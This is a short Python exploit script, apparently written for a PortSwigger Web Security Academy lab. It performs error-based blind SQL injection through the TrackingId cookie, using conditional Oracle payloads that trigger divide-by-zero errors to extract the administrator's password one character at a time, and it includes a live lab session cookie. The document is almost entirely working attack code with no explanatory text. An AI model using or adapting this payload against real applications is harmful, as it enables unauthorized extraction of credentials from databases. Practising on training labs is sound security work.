#!/usr/bin/python3

import requests
import signal
import sys
import time 
import string
from pwn import *



def def_handler(sig,frame):
    print ("\n\n....SALIENDO....\n\n")
    sys.exit(1);

#CONTROL+C

signal.signal(signal.SIGINT, def_handler)


main_url = "https://0a35008b04a2130e8192431600750080.web-security-academy.net"
characters = string.printable


p1= log.progress("Forece Brute")
p1.status("Starting Force Brute")


time.sleep(2)

p2 = log.progress("password-administrator")


def makeSQLI():
    
    user = ""

    for position in range(1,50):
        for character in characters:
             
            cookies = {
                'TrackingId' : "FPPQdM9fjoYKALuM'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where rownum=1)||'" % (position,character),
                'session' : "OeyTZdxkbd3VYIalqyaToyzyd0P2RTt5"       
            }
            
            p1.status(cookies['TrackingId'])

            r = requests.get(main_url,cookies=cookies)

            

            if r.status_code == 500:
                user += character
                p2.status(user)
                break



            
   
if __name__ == '__main__':

    makeSQLI()
